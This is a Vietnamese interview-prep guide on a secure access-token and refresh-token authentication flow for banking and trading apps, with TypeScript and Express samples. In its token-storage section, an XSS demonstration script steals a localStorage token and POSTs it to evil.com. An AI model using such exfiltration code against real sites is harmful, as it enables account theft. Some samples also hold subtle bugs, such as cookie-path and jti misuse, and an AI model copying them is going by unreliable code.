# 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security

## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"Secure auth flow: Access Token (short-lived, 15min, memory) + Refresh Token (long-lived, 7-30 days, httpOnly cookie). Implement token rotation, XSS/CSRF protection, MFA cho high-security systems."**

**🔑 Architecture - Dual Token Pattern:**

**1. Access Token (JWT):**
- **Thời hạn**: 15 phút (ngắn - limit damage nếu stolen)
- **Lưu ở**: Memory (JS variable) - KHÔNG localStorage (XSS vulnerable)
- **Dùng để**: API calls - `Authorization: Bearer <token>`
- **Mất khi**: Refresh page → lấy lại từ refresh token

**2. Refresh Token:**
- **Thời hạn**: 7-30 ngày (dài - UX tốt)
- **Lưu ở**: **httpOnly Cookie** - JS không đọc được (chống XSS)
- **Flags**: `Secure` (HTTPS only), `SameSite=Strict` (chống CSRF)
- **Dùng để**: Lấy access token mới khi expired

**3. Authentication Flow:**
```
Login → Server return:
  - Access Token (response body)
  - Refresh Token (httpOnly cookie)
→ Client lưu access token in memory
→ API calls với access token
→ Token expired (15min) → call /refresh endpoint
→ Server verify refresh token (cookie) → return new access token
```

**4. Security Measures:**
- **Token Rotation**: Refresh token thay đổi mỗi lần dùng (detect stolen tokens)
- **Token Blacklist**: Revoke tokens khi logout/suspicious activity
- **MFA**: 2FA/OTP cho sensitive operations (transfer, withdraw)
- **Device fingerprinting**: Detect unusual login locations
- **Rate limiting**: Max 5 failed attempts → lock account 30min

**⚠️ Lỗi Thường Gặp:**
- Lưu tokens trong localStorage → **XSS steal tokens**
- Không rotate refresh tokens → stolen token dùng mãi
- CORS misconfiguration → expose tokens cross-origin
- Không implement CSRF tokens → cross-site request attacks

**💡 Kiến Thức Senior:**
- **JWT structure**: Header.Payload.Signature (Base64URL encoded)
- **Signature algorithms**: HS256 (symmetric, shared secret) vs **RS256** (asymmetric, safer - banking)
- **Silent refresh**: Background refresh trước khi expired (smooth UX)
- **Token introspection**: Server-side validation cho high-security (không tin client JWT)
- **OAuth 2.0 + PKCE**: Authorization Code Flow với Proof Key (mobile apps)

**Trả lời:**

Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo mật cực kỳ cao** vì liên quan đến tiền bạc và thông tin nhạy cảm. Flow chuẩn sử dụng **JWT (JSON Web Token)** với **Access Token + Refresh Token** kết hợp **httpOnly Cookie**.

#### **📊 Tổng Quan Authentication Flow**

```
┌────────────────────────────────────────────────────────────────────┐
│              SECURE AUTHENTICATION FLOW                            │
│        (Banking/Trading System - Hệ Thống Ngân Hàng)              │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  🔑 ACCESS TOKEN                                                   │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: 15 phút (ngắn)                                   │ │
│  │ • Lưu ở: Memory (JavaScript variable)                       │ │
│  │ • Dùng để: Gọi API (Authorization: Bearer <token>)          │ │
│  │ • Mất khi: Refresh page (phải lấy lại)                      │ │
│  │ • Bảo mật: Không lưu localStorage (XSS risk)                │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                    │
│  🔄 REFRESH TOKEN                                                  │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: 7-30 ngày (dài)                                  │ │
│  │ • Lưu ở: httpOnly Cookie (server-side chỉ đọc được)         │ │
│  │ • Dùng để: Lấy Access Token mới khi hết hạn                 │ │
│  │ • Bảo mật: httpOnly + Secure + SameSite=Strict              │ │
│  │ • Không đọc được bởi JavaScript (chống XSS)                 │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                    │
│  🍪 SESSION COOKIE (Optional - cho Banking)                       │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: Session (đóng browser = mất)                    │ │
│  │ • Lưu ở: httpOnly Cookie                                    │ │
│  │ • Dùng để: Session ID (server tracking)                     │ │
│  │ • Bảo mật: httpOnly + Secure                                │ │
│  └──────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────┘
```

---

#### **🔐 1. Access Token vs Refresh Token - Phân Biệt Chi Tiết**

**Access Token (Token Truy Cập):**

```typescript
// Cấu trúc JWT Access Token
{
  "header": {
    "alg": "RS256",      // Thuật toán mã hóa (RSA + SHA256)
    "typ": "JWT"
  },
  "payload": {
    "sub": "user123",    // User ID
    "name": "John Doe",
    "email": "john@example.com",
    "role": "trader",    // Role: admin, trader, customer
    "permissions": ["trade", "view_balance", "transfer"],
    "iat": 1699999999,   // Issued At (thời điểm tạo)
    "exp": 1700000899    // Expiry (hết hạn sau 15 phút)
  },
  "signature": "..."     // Chữ ký số (verify token không bị giả mạo)
}

// Đặc điểm:
// ✅ Thời hạn ngắn: 5-15 phút
// ✅ Lưu trong memory (JavaScript variable)
// ✅ Gửi kèm mọi API request: Authorization: Bearer <token>
// ✅ Chứa thông tin user (role, permissions)
// ❌ KHÔNG lưu localStorage/sessionStorage (XSS risk)
```

**Refresh Token (Token Làm Mới):**

```typescript
// Cấu trúc Refresh Token (thường là random string)
{
  "jti": "unique-token-id-abc123xyz",  // Token ID duy nhất
  "sub": "user123",                    // User ID
  "iat": 1699999999,                   // Issued At
  "exp": 1702591999                    // Expiry (hết hạn sau 30 ngày)
}

// Đặc điểm:
// ✅ Thời hạn dài: 7-30 ngày (hoặc vô thời hạn)
// ✅ Lưu trong httpOnly Cookie (không đọc được bằng JS)
// ✅ Chỉ dùng để lấy Access Token mới
// ✅ Có thể revoke (thu hồi) từ server
// ❌ KHÔNG gửi kèm API thường (chỉ gửi tới /refresh endpoint)
```

**Tại Sao Cần 2 Token?**

```
┌────────────────────────────────────────────────────────────┐
│                    TẠI SAO CẦN 2 TOKEN?                    │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Scenario 1: Chỉ dùng 1 Access Token dài hạn              │
│  ┌──────────────────────────────────────────────────────┐ │
│  │ ❌ Nếu token bị leak (XSS, network sniffing)         │ │
│  │    → Hacker có 30 ngày để dùng token                 │ │
│  │    → Không thể thu hồi (revoke)                      │ │
│  │    → RỦI RO CỰC CAO!                                 │ │
│  └──────────────────────────────────────────────────────┘ │
│                                                            │
│  Scenario 2: Dùng Access Token (15 phút) + Refresh Token  │
│  ┌──────────────────────────────────────────────────────┐ │
│  │ ✅ Access Token bị leak                              │ │
│  │    → Chỉ dùng được 15 phút                           │ │
│  │    → Tự động hết hạn                                 │ │
│  │                                                       │ │
│  │ ✅ Refresh Token bị leak                             │ │
│  │    → Lưu httpOnly cookie (khó bị XSS)               │ │
│  │    → Server có thể revoke (blacklist)               │ │
│  │    → Có thể detect suspicious activity               │ │
│  │                                                       │ │
│  │ → RỦI RO THẤP HƠN NHIỀU!                             │ │
│  └──────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────┘
```

---

#### **🔄 2. Authentication Flow Chi Tiết (Step-by-Step)**

**A. Login Flow (Đăng Nhập):**

```typescript
// ============================================
// BƯỚC 1: User Login
// ============================================

// Frontend: Gửi username + password
async function login(username: string, password: string) {
  try {
    const response = await fetch('https://api.bank.com/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username,
        password,
        // Optional: MFA code, device fingerprint
        mfaCode: '123456',
        deviceId: getDeviceFingerprint(),
      }),
      credentials: 'include', // Quan trọng: Cho phép gửi/nhận cookie
    });

    if (!response.ok) {
      throw new Error('Login failed');
    }

    const data = await response.json();
    
    // {
    //   accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
    //   user: { id: "123", name: "John", role: "trader" },
    //   expiresIn: 900  // 15 phút (900 giây)
    // }
    
    // Refresh Token được server tự động set vào httpOnly cookie
    // Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
    
    return data;
  } catch (error) {
    console.error('Login error:', error);
    throw error;
  }
}

// ============================================
// BƯỚC 2: Server Xử Lý Login
// ============================================

// Backend (Node.js/Express)
app.post('/auth/login', async (req, res) => {
  const { username, password, mfaCode } = req.body;
  
  // 1. Verify username + password (bcrypt)
  const user = await db.findUserByUsername(username);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // 2. Verify MFA (Multi-Factor Authentication)
  if (!verifyMFA(user, mfaCode)) {
    return res.status(401).json({ error: 'Invalid MFA code' });
  }
  
  // 3. Check account status (not locked, not suspended)
  if (user.isLocked || user.isSuspended) {
    return res.status(403).json({ error: 'Account locked' });
  }
  
  // 4. Generate Access Token (15 phút)
  const accessToken = jwt.sign(
    {
      sub: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
      permissions: user.permissions,
    },
    process.env.ACCESS_TOKEN_SECRET,  // Private key (RSA)
    { expiresIn: '15m' }  // 15 phút
  );
  
  // 5. Generate Refresh Token (30 ngày)
  const refreshToken = jwt.sign(
    {
      jti: uuidv4(),  // Unique token ID
      sub: user.id,
    },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '30d' }  // 30 ngày
  );
  
  // 6. Lưu Refresh Token vào database (để có thể revoke sau)
  await db.saveRefreshToken({
    tokenId: refreshToken.jti,
    userId: user.id,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    deviceInfo: req.headers['user-agent'],
    ipAddress: req.ip,
  });
  
  // 7. Set Refresh Token vào httpOnly Cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,    // JavaScript không đọc được (chống XSS)
    secure: true,      // Chỉ gửi qua HTTPS
    sameSite: 'strict', // Chống CSRF
    maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngày
    path: '/auth/refresh',  // Chỉ gửi tới endpoint refresh
  });
  
  // 8. Log login event (audit trail)
  await logEvent({
    type: 'LOGIN_SUCCESS',
    userId: user.id,
    ipAddress: req.ip,
    deviceInfo: req.headers['user-agent'],
    timestamp: new Date(),
  });
  
  // 9. Return Access Token về client
  res.json({
    accessToken,
    user: {
      id: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
    },
    expiresIn: 900,  // 15 phút
  });
});

// ============================================
// BƯỚC 3: Frontend Lưu Access Token
// ============================================

// Store Access Token in memory (JavaScript variable)
let accessToken: string | null = null;

async function handleLogin(username: string, password: string) {
  const response = await login(username, password);
  
  // Lưu Access Token trong memory
  accessToken = response.accessToken;
  
  // Lưu user info (không sensitive) vào localStorage
  localStorage.setItem('user', JSON.stringify(response.user));
  
  // Redirect to dashboard
  window.location.href = '/dashboard';
}

// ❌ KHÔNG BAO GIỜ LÀM NHƯ NÀY:
// localStorage.setItem('accessToken', token);  // XSS risk!
// sessionStorage.setItem('accessToken', token); // Vẫn XSS risk!
```

---

**B. API Call Flow (Gọi API với Access Token):**

```typescript
// ============================================
// Frontend: Gọi API với Access Token
// ============================================

// Helper function: Tự động attach Access Token
async function apiCall(url: string, options: RequestInit = {}) {
  // Nếu Access Token hết hạn → refresh trước
  if (isTokenExpired(accessToken)) {
    await refreshAccessToken();
  }
  
  // Gửi request với Access Token
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`,  // Gửi token
    },
    credentials: 'include',  // Gửi cookies (refresh token)
  });
  
  // Nếu 401 Unauthorized → token invalid, logout
  if (response.status === 401) {
    await logout();
    window.location.href = '/login';
    throw new Error('Unauthorized');
  }
  
  return response.json();
}

// Usage: Gọi API lấy số dư tài khoản
const balance = await apiCall('https://api.bank.com/account/balance');
console.log(balance); // { balance: 1000000, currency: 'VND' }

// ============================================
// Backend: Verify Access Token
// ============================================

// Middleware: Verify JWT token
function authenticateToken(req, res, next) {
  // 1. Lấy token từ header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];  // "Bearer <token>"
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  // 2. Verify token
  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    if (err) {
      // Token expired hoặc invalid
      return res.status(403).json({ error: 'Invalid token' });
    }
    
    // 3. Attach user info vào request
    req.user = user;  // { sub: "123", role: "trader", ... }
    next();
  });
}

// Protected route
app.get('/account/balance', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const balance = await db.getBalance(userId);
  res.json(balance);
});
```

---

**C. Refresh Token Flow (Làm Mới Access Token):**

```typescript
// ============================================
// Frontend: Refresh Access Token
// ============================================

async function refreshAccessToken(): Promise<void> {
  try {
    const response = await fetch('https://api.bank.com/auth/refresh', {
      method: 'POST',
      credentials: 'include',  // Gửi httpOnly cookie (refreshToken)
      headers: {
        'Content-Type': 'application/json',
      },
    });
    
    if (!response.ok) {
      // Refresh token hết hạn hoặc invalid → logout
      throw new Error('Refresh token expired');
    }
    
    const data = await response.json();
    // {
    //   accessToken: "new-token...",
    //   expiresIn: 900
    // }
    
    // Cập nhật Access Token mới
    accessToken = data.accessToken;
    
    console.log('Access token refreshed');
  } catch (error) {
    console.error('Refresh failed:', error);
    
    // Logout user
    await logout();
    window.location.href = '/login';
  }
}

// Auto-refresh token trước khi hết hạn
function startTokenRefreshTimer() {
  // Refresh token trước 1 phút khi hết hạn
  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phút
  
  setInterval(async () => {
    await refreshAccessToken();
  }, refreshTime);
}

// Gọi khi app khởi động
startTokenRefreshTimer();

// ============================================
// Backend: Refresh Token Endpoint
// ============================================

app.post('/auth/refresh', async (req, res) => {
  // 1. Lấy Refresh Token từ httpOnly cookie
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // 2. Verify Refresh Token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    
    // 3. Check token trong database (chưa bị revoke?)
    const tokenRecord = await db.findRefreshToken(decoded.jti);
    if (!tokenRecord || tokenRecord.isRevoked) {
      return res.status(403).json({ error: 'Token revoked' });
    }
    
    // 4. Check user vẫn còn active
    const user = await db.findUserById(decoded.sub);
    if (!user || user.isLocked) {
      return res.status(403).json({ error: 'User inactive' });
    }
    
    // 5. Generate Access Token mới
    const newAccessToken = jwt.sign(
      {
        sub: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
        permissions: user.permissions,
      },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    // 6. Log refresh event
    await logEvent({
      type: 'TOKEN_REFRESH',
      userId: user.id,
      tokenId: decoded.jti,
      timestamp: new Date(),
    });
    
    // 7. Return Access Token mới
    res.json({
      accessToken: newAccessToken,
      expiresIn: 900,
    });
    
  } catch (error) {
    // Token expired hoặc invalid
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

---

**D. Logout Flow (Đăng Xuất):**

```typescript
// ============================================
// Frontend: Logout
// ============================================

async function logout(): Promise<void> {
  try {
    // 1. Gọi API logout (revoke refresh token)
    await fetch('https://api.bank.com/auth/logout', {
      method: 'POST',
      credentials: 'include',  // Gửi refreshToken cookie
    });
    
    // 2. Xóa Access Token khỏi memory
    accessToken = null;
    
    // 3. Xóa user info khỏi localStorage
    localStorage.removeItem('user');
    
    // 4. Clear any cached data
    sessionStorage.clear();
    
    // 5. Redirect to login
    window.location.href = '/login';
    
  } catch (error) {
    console.error('Logout error:', error);
    // Vẫn redirect về login dù có lỗi
    window.location.href = '/login';
  }
}

// ============================================
// Backend: Logout Endpoint
// ============================================

app.post('/auth/logout', async (req, res) => {
  // 1. Lấy Refresh Token từ cookie
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    try {
      // 2. Decode token
      const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
      
      // 3. Revoke token trong database (blacklist)
      await db.revokeRefreshToken(decoded.jti);
      
      // 4. Log logout event
      await logEvent({
        type: 'LOGOUT',
        userId: decoded.sub,
        tokenId: decoded.jti,
        timestamp: new Date(),
      });
      
    } catch (error) {
      console.error('Logout error:', error);
    }
  }
  
  // 5. Xóa Refresh Token cookie
  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',
  });
  
  // 6. Return success
  res.json({ message: 'Logged out successfully' });
});
```

---

#### **🛡️ 3. Security Best Practices (Thực Hành Bảo Mật)**

**A. Cookie Security:**

```typescript
// ============================================
// SECURE COOKIE CONFIGURATION
// ============================================

// ✅ ĐÚNG: Secure httpOnly Cookie
res.cookie('refreshToken', token, {
  httpOnly: true,    // JavaScript KHÔNG đọc được (chống XSS)
  secure: true,      // Chỉ gửi qua HTTPS (không qua HTTP)
  sameSite: 'strict', // Chống CSRF (không gửi cross-site)
  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngày
  path: '/auth/refresh',  // Chỉ gửi tới endpoint refresh
  domain: '.bank.com',  // Cho phép subdomain
});

// ❌ SAI: Không secure
res.cookie('refreshToken', token, {
  httpOnly: false,   // ❌ JS đọc được → XSS risk
  secure: false,     // ❌ Gửi qua HTTP → MITM attack
  sameSite: 'none',  // ❌ Gửi cross-site → CSRF risk
});

// ============================================
// Cookie Attributes Giải Thích
// ============================================

/**
 * httpOnly: true
 * - JavaScript không đọc được: document.cookie = undefined
 * - Chỉ server đọc được
 * - Chống XSS: Hacker inject script cũng không lấy được cookie
 * 
 * secure: true
 * - Chỉ gửi qua HTTPS (không qua HTTP)
 * - Chống MITM (Man-In-The-Middle) attack
 * - Production MUST có
 * 
 * sameSite: 'strict'
 * - Không gửi cookie khi navigate từ site khác
 * - Example: evil.com → bank.com (cookie KHÔNG gửi)
 * - Chống CSRF attack
 * - Options: 'strict' | 'lax' | 'none'
 *   - strict: Không gửi cross-site (most secure)
 *   - lax: Gửi khi GET navigation (moderate)
 *   - none: Gửi mọi cross-site (least secure)
 * 
 * path: '/auth/refresh'
 * - Cookie chỉ gửi tới endpoint này
 * - Giảm exposure (không gửi tới mọi endpoint)
 * 
 * domain: '.bank.com'
 * - Cho phép subdomain: api.bank.com, www.bank.com
 * - Không set = chỉ exact domain
 */
```

**B. Token Storage:**

```typescript
// ============================================
// WHERE TO STORE TOKENS?
// ============================================

// ✅ Access Token: MEMORY (JavaScript variable)
let accessToken: string | null = null;

// Lý do:
// - Mất khi refresh page (an toàn hơn)
// - Không bị XSS nếu page refresh
// - Short-lived (15 phút) nên OK

// ✅ Refresh Token: httpOnly Cookie
// Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict

// Lý do:
// - JavaScript không đọc được (chống XSS)
// - Auto gửi với requests (convenient)
// - Long-lived nhưng secure

// ❌ NEVER:
localStorage.setItem('accessToken', token);  // ❌ XSS risk!
sessionStorage.setItem('accessToken', token);  // ❌ Vẫn XSS risk!
document.cookie = `accessToken=${token}`;  // ❌ Readable by JS

// ============================================
// XSS Attack Example
// ============================================

// Nếu lưu token trong localStorage:
// Hacker inject script:
<script>
  // Steal token
  const token = localStorage.getItem('accessToken');
  
  // Send to hacker server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),
  });
  
  // Now hacker có token → impersonate user!
</script>

// Nếu dùng httpOnly cookie:
// Hacker inject script:
<script>
  // Try to steal
  const token = document.cookie; // undefined (httpOnly)
  
  // Cannot access! ✅ Secure
</script>
```

**C. Token Rotation (Xoay Vòng Token):**

```typescript
// ============================================
// REFRESH TOKEN ROTATION
// ============================================

// Backend: Mỗi lần refresh → generate token mới
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // Verify old token
  const decoded = jwt.verify(oldRefreshToken, SECRET);
  
  // Generate NEW Access Token
  const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
  
  // Generate NEW Refresh Token (rotation)
  const newRefreshToken = jwt.sign(
    { jti: uuidv4(), sub: decoded.sub },
    SECRET,
    { expiresIn: '30d' }
  );
  
  // Revoke old Refresh Token
  await db.revokeRefreshToken(decoded.jti);
  
  // Save new Refresh Token
  await db.saveRefreshToken(newRefreshToken);
  
  // Set new Refresh Token cookie
  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, ... });
  
  // Return new Access Token
  res.json({ accessToken: newAccessToken });
});

// Lợi ích:
// - Mỗi lần refresh → token mới
// - Old token bị revoke → không dùng lại được
// - Nếu hacker có old token → useless
// - Detect reuse attack (token revoked mà vẫn dùng)
```

---

#### **🔒 4. Special Cases (Các Trường Hợp Đặc Biệt)**

**A. Concurrent Requests (Nhiều Request Cùng Lúc):**

```typescript
// ============================================
// Problem: Race Condition
// ============================================

// User vừa mở 10 tabs, mỗi tab gọi API
// → 10 requests cùng lúc
// → Token hết hạn
// → 10 refresh requests cùng lúc ❌

// ============================================
// Solution: Request Queue với Promise
// ============================================

let refreshPromise: Promise<string> | null = null;

async function getValidToken(): Promise<string> {
  // Nếu token còn hiệu lực → return luôn
  if (accessToken && !isTokenExpired(accessToken)) {
    return accessToken;
  }
  
  // Nếu đang refresh → chờ promise hiện tại
  if (refreshPromise) {
    return await refreshPromise;
  }
  
  // Tạo promise mới để refresh
  refreshPromise = refreshAccessToken().then((newToken) => {
    refreshPromise = null;  // Reset
    return newToken;
  });
  
  return await refreshPromise;
}

async function apiCall(url: string) {
  const token = await getValidToken();  // Chờ token valid
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`,
    },
  });
}

// Kết quả:
// - 10 requests đầu tiên trigger refresh
// - Chỉ 1 refresh request thực sự gửi đi
// - 9 requests còn lại chờ promise đó
// - Tất cả dùng chung 1 token mới
```

**B. Inactivity Timeout (Tự Động Logout Khi Không Hoạt Động):**

```typescript
// ============================================
// AUTO LOGOUT AFTER INACTIVITY
// (Banking/Trading yêu cầu)
// ============================================

class InactivityTimer {
  private timeout: number = 5 * 60 * 1000;  // 5 phút không hoạt động
  private timer: NodeJS.Timeout | null = null;
  
  constructor() {
    this.startTimer();
    this.listenActivity();
  }
  
  // Bắt đầu đếm
  private startTimer() {
    this.clearTimer();
    
    this.timer = setTimeout(() => {
      this.onTimeout();
    }, this.timeout);
  }
  
  // Reset timer khi có activity
  private resetTimer() {
    this.startTimer();
  }
  
  // Lắng nghe user activity
  private listenActivity() {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    
    events.forEach((event) => {
      document.addEventListener(event, () => {
        this.resetTimer();
      }, { passive: true });
    });
  }
  
  // Timeout → logout
  private onTimeout() {
    console.log('Inactivity timeout - logging out');
    
    // Show warning dialog
    showWarningDialog('Bạn đã không hoạt động trong 5 phút. Vui lòng đăng nhập lại.');
    
    // Logout
    logout();
  }
  
  private clearTimer() {
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = null;
    }
  }
}

// Usage:
const inactivityTimer = new InactivityTimer();
```

**C. Device Fingerprinting (Nhận Diện Thiết Bị):**

```typescript
// ============================================
// DEVICE FINGERPRINTING
// ============================================

function getDeviceFingerprint(): string {
  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: screen.colorDepth,
    cpuCores: navigator.hardwareConcurrency,
  };
  
  // Hash fingerprint
  const fingerprint = hashSHA256(JSON.stringify(data));
  return fingerprint;
}

// Backend: Verify device
app.post('/auth/login', async (req, res) => {
  const { deviceId } = req.body;
  const user = await db.findUser(...);
  
  // Check device đã đăng ký chưa
  const knownDevice = await db.findDevice(user.id, deviceId);
  
  if (!knownDevice) {
    // Thiết bị mới → send OTP/email verification
    await sendOTPEmail(user.email);
    
    return res.status(403).json({
      error: 'Unknown device',
      requireOTP: true,
    });
  }
  
  // Device OK → proceed login
  // ...
});
```

**D. Logout All Devices (Đăng Xuất Tất Cả Thiết Bị):**

```typescript
// ============================================
// LOGOUT ALL DEVICES
// ============================================

// Frontend: Trigger logout all
async function logoutAllDevices() {
  await fetch('https://api.bank.com/auth/logout-all', {
    method: 'POST',
    credentials: 'include',
  });
  
  // Redirect to login
  window.location.href = '/login';
}

// Backend: Revoke all refresh tokens
app.post('/auth/logout-all', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Revoke tất cả refresh tokens của user
  await db.revokeAllRefreshTokens(userId);
  
  // Log event
  await logEvent({
    type: 'LOGOUT_ALL_DEVICES',
    userId,
    timestamp: new Date(),
  });
  
  res.json({ message: 'Logged out from all devices' });
});

// Use case:
// - User nghi ngờ account bị hack
// - Change password → logout all devices
// - Admin revoke access
```

---

#### **⚠️ 5. Common Security Mistakes (Lỗi Bảo Mật Thường Gặp)**

```typescript
// ❌ LỖI 1: Lưu token trong localStorage
localStorage.setItem('accessToken', token);  // XSS risk!

// ✅ ĐÚNG: Lưu trong memory
let accessToken: string | null = null;

// ────────────────────────────────────────

// ❌ LỖI 2: Access Token thời hạn quá dài
jwt.sign(payload, secret, { expiresIn: '30d' });  // Quá lâu!

// ✅ ĐÚNG: 5-15 phút
jwt.sign(payload, secret, { expiresIn: '15m' });

// ────────────────────────────────────────

// ❌ LỖI 3: Không verify token signature
const decoded = jwt.decode(token);  // ❌ Chỉ decode, không verify!

// ✅ ĐÚNG: Verify signature
jwt.verify(token, secret, (err, decoded) => { ... });

// ────────────────────────────────────────

// ❌ LỖI 4: Không revoke refresh token khi logout
// User logout → token vẫn valid → hacker dùng được

// ✅ ĐÚNG: Revoke token vào database blacklist
await db.revokeRefreshToken(tokenId);

// ────────────────────────────────────────

// ❌ LỖI 5: Gửi sensitive data trong token
jwt.sign({
  password: user.password,  // ❌ NEVER!
  creditCard: user.creditCard,  // ❌ NEVER!
}, secret);

// ✅ ĐÚNG: Chỉ non-sensitive data
jwt.sign({
  sub: user.id,
  name: user.name,
  role: user.role,
}, secret);

// ────────────────────────────────────────

// ❌ LỖI 6: Không check token blacklist
// Token bị revoke nhưng vẫn accept

// ✅ ĐÚNG: Check blacklist
const tokenRecord = await db.findRefreshToken(tokenId);
if (!tokenRecord || tokenRecord.isRevoked) {
  return res.status(403).json({ error: 'Token revoked' });
}

// ────────────────────────────────────────

// ❌ LỖI 7: Không rate limit refresh endpoint
// Hacker brute force refresh endpoint

// ✅ ĐÚNG: Rate limit
app.use('/auth/refresh', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 phút
  max: 10,  // Max 10 requests
}));

// ────────────────────────────────────────

// ❌ LỖI 8: Không log security events
// Không biết khi nào bị attack

// ✅ ĐÚNG: Log everything
await logEvent({
  type: 'LOGIN_FAILED',
  username,
  ipAddress: req.ip,
  reason: 'Invalid password',
  timestamp: new Date(),
});
```

---

#### **📊 6. Complete Flow Diagram**

```
┌────────────────────────────────────────────────────────────────────┐
│           COMPLETE AUTHENTICATION FLOW                             │
│      (Banking/Trading System - Hệ Thống Ngân Hàng)                │
└────────────────────────────────────────────────────────────────────┘

1️⃣ LOGIN
   User                     Frontend                Backend
    │                          │                       │
    │─── Enter credentials ──→│                       │
    │                          │─── POST /login ─────→│
    │                          │    {username, pwd}    │
    │                          │                       │
    │                          │                       │─ Verify credentials
    │                          │                       │─ Generate tokens
    │                          │                       │─ Save refresh token
    │                          │                       │
    │                          │←─ Set-Cookie ────────│
    │                          │   refreshToken        │
    │                          │   (httpOnly)          │
    │                          │                       │
    │                          │←─ { accessToken } ───│
    │←─ Redirect /dashboard ─│                       │
    │                          │                       │
    └─ accessToken in memory  │                       │

2️⃣ API CALL
   User                     Frontend                Backend
    │                          │                       │
    │─── Click "View Balance"→│                       │
    │                          │─ GET /balance ──────→│
    │                          │   Authorization:      │
    │                          │   Bearer <token>      │
    │                          │                       │
    │                          │                       │─ Verify token
    │                          │                       │─ Check permissions
    │                          │                       │
    │                          │←─ { balance: 1M } ───│
    │←─ Display balance ──────│                       │

3️⃣ TOKEN REFRESH (Auto - mỗi 14 phút)
   Frontend                Backend
      │                       │
      │─ POST /auth/refresh →│
      │   Cookie:             │
      │   refreshToken        │
      │                       │
      │                       │─ Verify refresh token
      │                       │─ Check not revoked
      │                       │─ Generate new access token
      │                       │
      │←─ { accessToken } ───│
      │                       │
   Update accessToken         │
   in memory                  │

4️⃣ LOGOUT
   User                     Frontend                Backend
    │                          │                       │
    │─── Click "Logout" ─────→│                       │
    │                          │─ POST /logout ──────→│
    │                          │   Cookie:             │
    │                          │   refreshToken        │
    │                          │                       │
    │                          │                       │─ Revoke token
    │                          │                       │─ Clear cookie
    │                          │                       │
    │                          │←─ { success } ───────│
    │                          │                       │
    │                          │─ accessToken = null   │
    │                          │─ Clear localStorage   │
    │←─ Redirect /login ──────│                       │
```

---

#### **💡 Summary (Tóm Tắt)**

**Access Token 🔑**
- **15 phút**, lưu **memory**, dùng gọi API
- Mất khi refresh page → re-fetch từ refresh token

**Refresh Token 🔄**
- **30 ngày**, lưu **httpOnly cookie**, dùng lấy access token
- Secure: httpOnly + Secure + SameSite=Strict

**Best Practices 🛡️**
- ✅ Never localStorage (XSS risk)
- ✅ httpOnly cookie cho refresh token
- ✅ Short-lived access token (15 phút)
- ✅ Token rotation (refresh → new token)
- ✅ Revoke tokens khi logout
- ✅ Rate limiting
- ✅ Inactivity timeout (5-10 phút)
- ✅ Device fingerprinting
- ✅ Audit logging

**Khi Nào Logout:**
- User click logout ✅
- Inactivity > 5 phút ✅
- Refresh token expired ✅
- Suspicious activity detected ✅
- User change password ✅
- Admin revoke access ✅

**Khi Nào Giữ Session:**
- User đang hoạt động (reset timer)
- Refresh token còn valid
- Device trusted
- No security alerts

**Key Takeaway:**
- **Banking/Trading** yêu cầu bảo mật CỰC CAO
- **2 tokens** (access + refresh) = balance giữa UX và security
